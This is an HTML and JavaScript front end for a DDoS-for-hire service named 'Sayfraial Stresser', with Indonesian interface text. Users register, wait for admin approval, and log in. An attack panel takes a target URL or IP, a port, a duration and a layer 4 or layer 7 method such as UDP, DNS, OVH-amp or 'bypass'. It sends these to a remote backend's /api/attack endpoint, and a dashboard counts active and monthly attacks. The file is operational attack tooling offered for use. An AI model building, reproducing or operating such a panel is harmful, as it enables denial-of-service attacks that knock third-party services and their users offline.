<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Sayfraial Stresser</title>
  <style>
    * {
      box-sizing: border-box;
    }
    body {
      margin: 0;
      font-family: 'Segoe UI', sans-serif;
      background-color: #0d0d0d;
      color: #fff;
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
    }
    .container {
      width: 100%;
      max-width: 420px;
      padding: 20px;
    }
    .card {
      background: #1a1a1a;
      border-radius: 12px;
      padding: 24px;
      box-shadow: 0 0 20px rgba(0,0,0,0.5);
      margin-bottom: 24px;
    }
    h1, h2 {
      text-align: center;
      margin-bottom: 16px;
    }
    input, select, button {
      width: 100%;
      padding: 12px;
      margin-top: 10px;
      background-color: #2a2a2a;
      border: 1px solid #444;
      border-radius: 8px;
      color: #fff;
      font-size: 14px;
    }
    input:focus, select:focus {
      outline: none;
      border-color: #00cc99;
    }
    button {
      background-color: #00cc66;
      color: #fff;
      font-weight: bold;
      cursor: pointer;
      border: none;
      transition: 0.2s;
    }
    button:hover {
      background-color: #00b359;
    }
    .link-small {
      font-size: 13px;
      color: #00aaff;
      cursor: pointer;
      margin-top: 8px;
      text-align: right;
    }
    .hidden {
      display: none;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Sayfraial Stresser</h1>

    <!-- Login -->
    <div id="login" class="card">
      <h2>Login</h2>
      <input type="text" id="user" placeholder="Username" />
      <input type="password" id="pass" placeholder="Password" />
      <button onclick="login()">Login</button>
      <p class="link-small" onclick="showRegister()">Sign up</p>
    </div>

    <!-- Register -->
    <div id="register" class="card hidden">
      <h2>Register</h2>
      <input type="text" id="regUser" placeholder="Username" />
      <input type="password" id="regPass" placeholder="Password" />
      <input type="text" id="captcha" placeholder="What is 3 + 4?" />
      <button onclick="register()">Register</button>
      <p class="link-small" onclick="showLogin()">Back to login</p>
    </div>

    <!-- Attack -->
    <div id="attack" class="card hidden">
      <h2>Attack Panel</h2>
      <input type="text" id="target" placeholder="Target URL/IP" />
      <input type="number" id="port" placeholder="Port" />
      <input type="number" id="time" placeholder="Duration (s)" />
      <select id="layer" onchange="loadMethods()">
        <option value="">-- Pilih Layer --</option>
        <option value="layer4">L4</option>
        <option value="layer7">L7</option>
      </select>
      <select id="method"></select>
      <button onclick="sendAttack()">ðŸš€ Attack</button>
    </div>

    <!-- Dashboard -->
    <div id="dashboard" class="card hidden">
      <h2>ðŸ“Š Dashboard</h2>
      <p id="stat-now">Attack Aktif: </p>
      <p id="stat-today">Hari Ini: </p>
      <p id="stat-month">Bulan Ini: </p>
    </div>

    <!-- Admin Panel -->
    <div id="admin" class="card hidden">
      <h2>Admin Panel</h2>
      <input type="text" id="newUser" placeholder="Username Baru" />
      <input type="text" id="newPass" placeholder="Password Baru" />
      <button onclick="createUser()">Create User</button>
    </div>
  </div>

  <script>
    const BASE = 'https://hospitable-bravery-production.up.railway.app';
    let isAdmin = false;

    function login() {
      const user = document.getElementById('user').value;
      const pass = document.getElementById('pass').value;

      fetch(BASE + '/api/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ user, pass })
      })
      .then(res => res.json())
      .then(data => {
        if (!data.allowed) return alert('Belum di-approve oleh admin');
        document.getElementById('login').classList.add('hidden');
        document.getElementById('attack').classList.remove('hidden');
        document.getElementById('dashboard').classList.remove('hidden');
        if (data.isAdmin) {
          isAdmin = true;
          document.getElementById('admin').classList.remove('hidden');
        }
        loadStats();
      })
      .catch(() => alert('Login gagal'));
    }

    function register() {
      const user = document.getElementById('regUser').value;
      const pass = document.getElementById('regPass').value;
      const captcha = document.getElementById('captcha').value;
      if (captcha != '7') return alert('Captcha salah');

      fetch(BASE + '/api/register', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ user, pass })
      })
      .then(res => res.json())
      .then(() => alert('Berhasil daftar, tunggu approval admin'))
      .catch(() => alert('Gagal daftar'));
    }

    function showRegister() {
      document.getElementById('login').classList.add('hidden');
      document.getElementById('register').classList.remove('hidden');
    }

    function showLogin() {
      document.getElementById('register').classList.add('hidden');
      document.getElementById('login').classList.remove('hidden');
    }

    function loadMethods() {
      const layer = document.getElementById('layer').value;
      const method = document.getElementById('method');
      method.innerHTML = '';

      const methods = {
        layer4: ["udp", "dns", "tcp", "fivem", "minecraft", "ovh-amp", "vse"],
        layer7: ["kalimasada", "tls", "trump", "tlsx", "bypass", "h2-blast", "https"]
      };

      if (methods[layer]) {
        methods[layer].forEach(m => {
          const opt = document.createElement('option');
          opt.value = m;
          opt.innerText = m.toUpperCase();
          method.appendChild(opt);
        });
      }
    }

    function sendAttack() {
      const target = document.getElementById('target').value;
      const port = document.getElementById('port').value;
      const time = document.getElementById('time').value;
      const method = document.getElementById('method').value;

      fetch(BASE + '/api/attack', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ target, port, time, method })
      })
      .then(res => res.json())
      .then(data => alert('Attack sent: ' + JSON.stringify(data)))
      .catch(e => alert('Error: ' + e.message));
    }

    function createUser() {
      if (!isAdmin) return alert('Bukan admin');

      const newUser = document.getElementById('newUser').value;
      const newPass = document.getElementById('newPass').value;

      fetch(BASE + '/api/create-user', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          adminUser: document.getElementById('user').value,
          adminPass: document.getElementById('pass').value,
          newUser, newPass
        })
      })
      .then(res => res.json())
      .then(() => alert('User created'))
      .catch(() => alert('Gagal create user'));
    }

    function loadStats() {
      fetch(BASE + '/api/stats')
        .then(res => res.json())
        .then(data => {
          document.getElementById('stat-now').innerText = 'Attack Aktif: ' + data.now;
          document.getElementById('stat-today').innerText = 'Hari Ini: ' + data.today;
          document.getElementById('stat-month').innerText = 'Bulan Ini: ' + data.month;
        });
    }
  </script>
</body>
</html>

